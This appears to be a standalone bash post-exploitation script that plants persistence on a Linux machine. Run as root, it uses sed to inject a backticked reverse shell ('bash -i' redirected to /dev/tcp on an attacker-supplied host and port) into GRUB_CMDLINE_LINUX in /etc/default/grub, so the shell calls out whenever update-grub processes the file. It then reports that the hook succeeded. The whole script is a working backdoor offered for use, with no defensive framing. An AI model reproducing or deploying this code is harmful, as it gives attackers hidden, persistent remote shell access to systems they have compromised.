#!/bin/bash

# update-grub hook    by 0bfxgh0st*

if [[ $(id -u) != 0 ]];
then
	printf "%s\n" "Run as root"
	exit
fi

if [[ -z "$1" ]] || [[ -z "$2" ]];
then
	printf "%s\n" "Usage sudo bash update-grub_hook.sh <rhost> <rport>"
else
	rhost=$1
	rport=$2
	grubdir="/etc/default/grub"
	sed -i -e 's/GRUB_CMDLINE_LINUX=".*"/GRUB_CMDLINE_LINUX=`bash -c "bash -i >\& \/dev\/tcp\/'$rhost'\/'$rport' 0>\&1 \&" 2>\/dev\/null`/g' $grubdir
	cat $grubdir
	printf "\n[\e[32m+\e[0m] update-grub hooked\n"
        printf "[\e[32m+\e[0m] Persistence through update-grub success\n"
fi
